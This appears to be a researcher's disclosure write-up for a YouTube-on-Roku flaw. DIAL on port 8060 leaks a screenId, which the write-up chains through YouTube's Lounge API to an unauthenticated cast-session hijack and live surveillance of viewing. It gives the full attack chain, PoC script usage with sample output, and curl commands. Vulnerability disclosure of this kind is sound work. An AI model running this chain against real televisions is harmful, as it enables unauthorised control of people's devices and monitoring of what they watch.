
# YouTube Cast Session Hijack via Unauthenticated DIAL Token Leak

> YouTube on Roku TVs leaks a `screenId` through the DIAL protocol that can be exchanged for a YouTube Lounge API token — giving any unauthenticated device on the local network full cast session control: play arbitrary videos, pause, seek, change volume, and conduct real-time surveillance of the user's viewing activity.

---

## Summary

YouTube on Roku TVs registers a DIAL endpoint on port 8060 that exposes device-level session tokens in `additionalData` — readable by any device on the local network with a single `GET` request, no authentication required. The critical token is `screenId`, which can be exchanged for full cast session control.

**Three attack paths to obtain `screenId` — all unauthenticated:**

1. **YouTube running:** `GET /dial/YouTube` with `Origin: https://www.youtube.com` returns `screenId` along with `yumi`, `oisi`, `deviceId`, and `passiveSessionId`
2. **YouTube TV installed (stopped):** `GET /dial/YouTubeTV` leaks `screenId` even while the app is **stopped** — zero prerequisites beyond the app being installed
3. **ECP launch:** `POST /launch/837` forces YouTube to open via Roku's External Control Protocol, then poll DIAL until `screenId` appears (~about 30 seconds) — the attacker triggers the app remotely

Once `screenId` is obtained, the attacker can:
1. Exchange it for a `loungeToken` via YouTube's public pairing API
2. Bind as a `REMOTE_CONTROL` device via YouTube's Lounge API
3. Send playback commands and receive real-time state events — full cast session control

The entire chain requires zero authentication, zero user interaction, and produces needs no prompt from the TV.

Additionally, `yumi` (YouTube User Machine Identifier), `oisi`, `deviceId`, and `passiveSessionId` tokens are exposed alongside `screenId`. These persist across app restarts. While these device-level tokens did not authenticate against YouTube's backend APIs during testing, their persistent exposure enables device fingerprinting and session tracking.

During testing, YouTube and YouTube TV were the only DIAL-registered apps observed leaking tokens through `additionalData`. 80+ app names were tested against DIAL including Netflix, Prime Video, Paramount+, Pluto TV, CBS, Disney+, Hulu, Spotify, and all other Google apps (YouTubeKids, YouTubeMusic, GooglePlay, etc.) — none returned token data. **However, these apps were not signed in during testing, so their behavior with an active session is unconfirmed.**

---

## Attack Chain

```
Attacker (LAN)                    Roku TV (port 8060)              YouTube (googleapis.com)
     |                                   |                                |
     |--- GET /dial/YouTube ------------>|                                |
     |<-- screenId, yumi, oisi ----------|                                |
     |                                                                    |
     |--- POST get_lounge_token_batch (screenId) ----------------------->|
     |<-- loungeToken ---------------------------------------------------|
     |                                                                    |
     |--- POST bc/bind (loungeToken, REMOTE_CONTROL) ------------------->|
     |<-- SID, gsessionid, nowPlaying, volume, deviceInfo ---------------|
     |                                                                    |
     |--- POST bc/bind (setPlaylist, videoId) --------------------------->|
     |<-- [video plays on TV, user has no way to block it] --------------|
     |                                                                    |
     |--- GET bc/bind (long-poll, TYPE=xmlhttp) ------------------------>|
     |<-- [real-time stream: every video change, pause, seek, volume] ---|
```

---

## Impact

### Cast session control (confirmed live)

| Capability | Command | Confirmed |
|---|---|---|
| Play arbitrary video | `setPlaylist` + `videoId` | Yes |
| Pause playback | `pause` | Yes |
| Resume playback | `play` | Yes |
| Seek to timestamp | `seekTo` + `newTime` | Yes |
| Set volume | `setVolume` + `volume` | Yes |
| Next / previous track | `next` / `previous` | Yes |
| Toggle subtitles | `setSubtitlesTrack` | Yes |
| Generate persistent pairing code | `get_pairing_code` + `access_type=permanent` | Yes — 12-digit code returned |

### Real-time surveillance (confirmed live)

On initial bind and via long-poll, the attacker receives:

| Event | Data exposed |
|---|---|
| `nowPlaying` | `videoId`, `currentTime`, `duration`, `playabilityStatus`, `state`, `listId` |
| `mdxExpandedReceiverVideoIdList` | Videos the user was watching **before** the attacker connected |
| `onVolumeChanged` | Current volume level, mute state |
| `onStateChange` | Play/pause/buffer state transitions in real-time |
| `onVideoQualityChanged` | Available quality levels (e.g. 1080, 720, 480), current quality |
| `onAudioTrackChanged` | Active audio track and language |
| `onSubtitlesTrackChanged` | Full subtitle styling configuration |
| `playlistModified` | Queue contents (video IDs) |
| `loungeStatus` | All paired devices, device capabilities, `localChannelEncryptionKey` |

### Persistent token exposure (confirmed)

| Token | Leaks when stopped? | Persists across restart? | What it identifies |
|---|---|---|---|
| `yumi` | Yes | Yes | Device-level YouTube identifier |
| `oisi` | Yes | Yes | Session tracking token |
| `oisiTimestamp` | Yes | Yes | Session establishment time |
| `passiveSessionId` | Yes | Yes | DIAL/cast session UUID |
| `deviceId` | Yes | Yes | Device-level UUID |
| `screenId` | YouTube: running only | Yes (while running) | Cast session identifier — **enables full hijack chain** |
| `screenId` | **YouTube TV: while stopped** | Yes | Same — **zero prerequisite attack path** |

### Internal build hash leak (via DIAL)

The DIAL `additionalData` block contains a field `testYWRkaXR` with a value of `c0ef1ca` (7 hex characters). The tag name is a composite: `test` + base64-encoded `addit` — decoding to **"test additionalData"**, a debug field left in the production DIAL response. The value `c0ef1ca` matches the format of a short git commit hash (7 hex chars), indicating the YouTube DIAL implementation is leaking its internal build/commit identifier. This allows an attacker to identify the exact source revision running on the device.

### Device fingerprinting (via DIAL + bind response)

The DIAL response exposes `brand` and `model`. The bind response additionally exposes: manufacture year, OS (Roku), OS version, chipset, YouTube client name and version, DIAL server type, and all paired remote control devices.

### What was NOT confirmed

- `yumi`/`oisi` tokens **did not** authenticate against YouTube's backend APIs (all attempts returned 401). They are device identifiers, not OAuth tokens.
- Stored watch history, subscriptions, and account profile information are **not** accessible through the Lounge API. Only real-time playback state is exposed.
- The permanent pairing code was successfully generated, but persistent access across TV reboots was not tested.

---

## Proof of Concept

### Full hijack chain (automated)
```bash
python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt

# Run the full 4-step hijack — plays a video on the TV, dumps all stolen credentials
python3 poc.py --ip <ROKU_IP> --hijack

# Or play a specific video
python3 poc.py --ip <ROKU_IP> --play <VIDEO_ID>
```

```
[*] Target: <ROKU_IP>:8060
[*] YouTube Cast Session Hijack

[Step 1] Extracting screenId from DIAL...
[+] screenId (YouTube TV — stopped): <REDACTED>...

[Step 2] Exchanging screenId for loungeToken...
[+] loungeToken: <REDACTED>...

[Step 3] Binding as REMOTE_CONTROL...
[+] Bound as REMOTE_CONTROL
[+] SID: <REDACTED>

[+] Cast session hijacked — full control confirmed

[Step 4] Playing video: dQw4w9WgXcQ
[+] setPlaylist: 200

[+] Done — video is playing on the TV, zero auth required

[*] Stolen credentials:
    screenId: <REDACTED>
    token: <REDACTED>
    SID: <REDACTED>
    gsessionid: <REDACTED>
    brand: <REDACTED>
    model: <REDACTED>
    yumi: <REDACTED>
    oisi: <REDACTED>
    device_id: <REDACTED>
    passive_session_id: <REDACTED>
```

The PoC automatically tries three paths to obtain `screenId`:
1. YouTube DIAL (if YouTube is running)
2. YouTube TV DIAL (leaks while stopped — zero prerequisite)
3. ECP launch (forces YouTube open via `POST /launch/837`, polls until `screenId` appears)

### Manual token verification
```bash
# Read YouTube DIAL state (requires Origin header — this is the information leak)
curl -H "Origin: https://www.youtube.com" http://<ROKU_IP>:8060/dial/YouTube

# Compare — Netflix returns clean state, no tokens
curl http://<ROKU_IP>:8060/dial/Netflix
```

---

## Affected Product

- **Vendor:** Google LLC (YouTube)
- **Product:** YouTube / YouTube TV apps on Roku OS
- **Tested Version:** YouTube 2.23.150000193 on Roku OS 16.0.4
- **Tested Hardware:**
  - TCL 32S327 (Roku TV) — confirmed via YouTube DIAL + ECP launch
  - RCA Roku TV — confirmed via YouTube TV DIAL (leaks `screenId` while stopped)
- **Likely Affected:** All Roku devices running YouTube or YouTube TV with DIAL support

---

## Disclaimer

For **educational and responsible disclosure purposes only**.
Do not test on devices you don't own or lack permission to assess.

---

## Disclosure Timeline

- Vulnerability discovered: 2026-11-17
- Cast session hijack chain confirmed: 2026-11-18
- YouTube TV stopped-state leak confirmed on RCA: 2026-11-18
- ECP launch bypass confirmed on TCL: 2026-11-18
- PoC finalized: 2026-11-19
- Reported to: VulnCheck
- CVE status: **Pending**
- Researcher: **NSM Barii** — https://github.com/nsm-barii
